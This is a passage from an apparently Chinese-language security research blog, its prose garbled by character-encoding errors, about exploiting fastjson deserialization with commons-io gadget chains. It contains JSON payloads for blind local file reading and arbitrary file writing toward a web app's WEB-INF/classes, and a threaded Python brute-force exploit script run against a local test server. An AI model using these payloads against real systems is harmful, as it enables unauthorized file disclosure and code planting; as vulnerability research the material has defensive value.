</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;boms&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bytes&#34;</span><span class="p">:</span><span class="w"> </span><span class="o">[</span><span class="n">59</span><span class="p">,</span><span class="n">32</span><span class="p">,</span><span class="n">102</span><span class="o">]</span><span class="c1">//${data}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.a.BOM&#34;</span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250604165930698.png" alt="image-20250604165930698"  />
</p>
<p>å› ä¸ºéœ€è¦çˆ†ç ´ç›®å½•ï¼Œæ‰‹æµ‹æœ‰ç‚¹éº»çƒ¦ï¼Œè¿˜æ˜¯è®©aiå†™äº†ä¸ªè„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">char_code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">boundary</span> <span class="o">=</span> <span class="s2">&#34;----WebKitFormBoundaryROOGnnZjMDt56Gw0&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Host&#34;</span><span class="p">:</span> <span class="s2">&#34;127.0.0.1:8080&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Disposition: form-data; name=&#34;json&#34;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;{</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  &#34;a&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;    &#34;@type&#34;: &#34;java.io.InputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;    &#34;@type&#34;: &#34;org.apache.commons.io.input.BOMInputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      &#34;delegate&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;@type&#34;: &#34;org.apache.commons.io.input.ReaderInputStream&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;reader&#34;: {</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;          &#34;@type&#34;: &#34;jdk.nashorn.api.scripting.URLReader&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;          &#34;url&#34;: &#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s1">&#34;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        },</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;charsetName&#34;: &#34;UTF-8&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        &#34;bufferSize&#34;: &#34;1024&#34;</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      },</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      &#34;boms&#34;: [</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        {</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;          &#34;charsetName&#34;: &#34;UTF-8&#34;,</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;          &#34;bytes&#34;: [</span><span class="si">{</span><span class="n">char_code</span><span class="si">}</span><span class="s1">]</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;        }</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;      ]</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  },</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  &#34;b&#34;: {&#34;$ref&#34;:&#34;$.a.BOM&#34;}</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;}</span><span class="se">\r\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s1">&#39;--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s1">--</span><span class="se">\r\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;http://127.0.0.1:8080/json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error sending request: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">common_codes</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">58</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span> <span class="mi">91</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">123</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">other_codes</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">common_codes</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ordered_codes</span> <span class="o">=</span> <span class="n">common_codes</span> <span class="o">+</span> <span class="n">other_codes</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ä¼˜å…ˆå¸¸è§å­—ç¬¦ï¼Œç„¶åæµ‹è¯•å…¶ä»–å­—ç¬¦</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_force_chars</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">50</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>  <span class="c1"># å¯æ ¹æ®ç½‘ç»œæƒ…å†µè°ƒæ•´çº¿ç¨‹æ•°</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">futures</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">code</span> <span class="ow">in</span> <span class="n">ordered_codes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">full_code</span> <span class="o">=</span> <span class="n">valid_chars</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">futures</span><span class="p">[</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">send_request</span><span class="p">,</span> <span class="n">target_url</span><span class="p">,</span> <span class="n">full_code</span><span class="p">)]</span> <span class="o">=</span> <span class="n">code</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">futures</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">code</span> <span class="o">=</span> <span class="n">futures</span><span class="p">[</span><span class="n">future</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response_text</span> <span class="o">=</span> <span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">response_text</span> <span class="ow">and</span> <span class="s1">&#39;&#34;b&#34;:null&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response_text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">valid_chars</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">valid_chars</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">bytes_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">b</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Final result:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bytes_list</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># if len(sys.argv) != 2:</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#     print(&#34;Usage: python exploit.py &lt;target_url&gt;&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#     print(&#34;Example: python exploit.py file:///C:/Windows/win.ini&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#     sys.exit(1)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1"># target_url = sys.argv[1]</span>
</span></span><span class="line"><span class="cl">      <span class="n">brute_force_chars</span><span class="p">(</span><span class="s2">&#34;file:///C:/Users&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#   brute_force_chars(target_url)</span>
</span></span></code></pre></div><p><img loading="lazy" src="images/image-20250630111650333.png" alt="image-20250630111650333"  />
</p>
<p>ä½†æ˜¯åœ¨windowç¯å¢ƒä¸‹æ„Ÿè§‰æœ‰ç‚¹ç¾éš¾ï¼Œå› ä¸ºæˆ‘æœ¬åœ°ç¯å¢ƒä¸‹Tempçš„ç›®å½•å¤ªå¤šäº†ï¼ŒæŸ¥çœ‹äº†ç¿»ä»£ç å¸Œæœ›è¾¾åˆ°<code>.../Temp/tomcat.*</code>åŒ¹é…tomcatå¼€å¤´æ–‡ä»¶ï¼ˆæ— æœï¼‰</p>
<h3 id="step3-å†™å…¥æ–‡ä»¶">Step3: å†™å…¥æ–‡ä»¶<a hidden class="anchor" aria-hidden="true" href="#step3-å†™å…¥æ–‡ä»¶">#</a></h3>
<p>è¿™é‡Œæˆ‘åŠ äº†å‡ å¤„<code>charsetName</code>ï¼Œä¸ç„¶æˆ‘ç¯å¢ƒä¼šæŠ¥é”™ç¼ºå°‘charset Name</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.AutoCloseInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;in&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;input&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.CharSequenceInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;cs&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.String&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;1234&#34;</span><span class="p">,</span><span class="c1">//${shellcode}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">4</span><span class="w"> </span><span class="c1">//${size}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;branch&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.WriterOutputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;writer&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.output.LockableFileWriter&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;file&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;./test3&#34;</span><span class="p">,</span><span class="c1">//${filename}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="s">&#34;append&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		  </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;UTF-8&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;charset&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">1024</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;writeImmediately&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;closeBranch&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.io.InputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;reader&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;inputStream&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;$.a&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;httpContentType&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;text/xml&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;lenient&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;defaultEncoding&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;charsetName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;iso-8859-1&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;bufferSize&#34;</span><span class="p">:</span><span class="w"> </span><span class="n">1024</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;c&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>åˆ©ç”¨å›¾</strong></p>
<p><img loading="lazy" src="images/image-20250624095112368.png" alt="image-20250624095112368"  />
</p>
<p><img loading="lazy" src="images/image-20250624090707708.png" alt="image-20250624090707708"  />
</p>
<p>åˆ©ç”¨è°ƒç”¨å¦‚ä¸Šï¼Œç»†è¯´æ„Ÿè§‰ä¹Ÿæè¿°ä¸å‡ºæ¥ï¼Œç„¶åæœ‰å‡ ä¸ªç‚¹è¦è¯´ä¸‹</p>
<ul>
<li><code>LockableFileWriter</code> fileè¿™é‡Œåˆå§‹åŒ–æ—¶ï¼Œä¼šå¸®æˆ‘ä»¬åˆ›å»ºç›®å½•ï¼Œä¸€èˆ¬æƒ…å†µä¸‹<code>tomcat-docbase.xxx</code>è¿™ä¸ªç›®å½•ä¸‹æ˜¯æ²¡æœ‰<code>WEB-INF/classes</code>,è¿™ä¸ªç›®å½•éœ€è¦æˆ‘ä»¬æ¥åˆ›å»ºï¼Œè€Œè¿™é‡Œ<code>LockableFileWriter</code>ç›´æ¥è§£å†³äº†è¿™ä¸ªé—®é¢˜</li>
</ul>
<p><img loading="lazy" src="images/image-20250630172922564.png" alt="image-20250630172922564"  />
</p>
<ul>
<li>poc ä¸­ $ref</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;@type&#34;: &#34;org.apache.commons.io.input.XmlStreamReader&#34;,
</span></span><span class="line"><span class="cl">        &#34;inputStream&#34;: {
</span></span><span class="line"><span class="cl">          &#34;$ref&#34;: &#34;$.a&#34;
</span></span><span class="line"><span class="cl">        }
</span></span></code></pre></div><p>åœ¨<code>XmlStreamReader</code>åˆå§‹åŒ–æ—¶ï¼Œ<code>inputStream</code>å¯ä»¥ç›´æ¥è·å–åˆ°<code>$.a</code>çš„å€¼ï¼Œè€Œä¸ä¸æ˜¯ç­‰åˆ°ååºåˆ—åŒ–å®Œï¼Œåœ¨å¯¹$refçš„é‚£ç§è°ƒç”¨</p>
<ul>
<li>æœ€åä¸€ä¸ªå³æ˜¯å†™å…¥æ–‡ä»¶çš„å‘å§ï¼Œæˆ‘æœ¬åœ°è°ƒè¯•æ˜¯ä¸€æ¬¡æœ€å¤šå†™å…¥**<code>15</code>**ä¸ªå­—ç¬¦ï¼Œåç»­å†™å…¥å¯ä»¥<code>è¿½åŠ </code>å†™å…¥åˆ°æ–‡ä»¶é‡Œã€‚ä½†æ˜¯æˆ‘çœ‹@1ueçš„pocæ˜¯20ä¸ªï¼Œä½†æ˜¯åœ¨æˆ‘æœ¬åœ°ç¯å¢ƒè°ƒè¯•æ¥çœ‹æ˜¯ä¸è¡Œçš„ã€‚</li>
</ul>
<p>ä¼šè°ƒç”¨2æ¬¡<code>TeeInputStream#read</code>ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”¨äºå†™å…¥ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”¨äºè¿”å›<code>EOF</code>è¾¾åˆ°close()æ–‡ä»¶çš„æ•ˆæœ</p>
<p><img loading="lazy" src="images/image-20250630174754931.png" alt="image-20250630174754931"  />
</p>
<p>åé¢å‘ç°<code>ä¸€æ¬¡å†™å…¥è¿‡å¤š</code>æ—¶ï¼Œä¸ä»…<code>æ²¡æœ‰å­—ç¬¦</code>å†™å…¥ï¼Œå†™å…¥å¯¹åº”çš„<code>æ–‡ä»¶</code>ä¹Ÿæ“ä½œä¸äº†ï¼ˆæ€€ç–‘æ˜¯ä¸€ç›´å¤„äºopençŠ¶æ€äº†ï¼Œæ²¡closeï¼‰ï¼Œåªèƒ½å†™å…¥æ–°çš„æ–‡ä»¶</p>
<p>è°ƒè¯•å‘ç°æ˜¯æ²¡æœ‰è¿›è¡Œ<code>close()</code>,åç»­å‘ç°æ˜¯è·Ÿ<code>getBOM()</code>è¿™é‡Œæœ‰å…³ï¼Œæ³¨æ„è¿™é‡Œçš„<code>maxBomSize</code>è¿™ä¸ªå€¼æ˜¯ä½œä¸ºä¸‹æ–¹<code>forçš„length</code>ã€‚</p>
